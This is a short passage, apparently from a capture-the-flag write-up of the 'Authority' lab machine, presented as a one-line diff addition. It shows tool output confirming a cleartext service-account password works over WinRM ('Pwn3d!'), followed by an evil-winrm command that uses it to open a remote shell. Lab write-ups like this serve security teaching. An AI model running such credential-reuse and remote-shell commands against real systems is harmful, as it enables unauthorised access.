@@ -1,0 +1,1 @@
+http://10.10.11.222:5985/wsman HTTP 10.10.11.222 5985 AUTHORITY [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!) I’ll go directly to WinRM and get a shell: oxdf@hacky$ evil-winrm -i authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!' Evil-WinRM shell
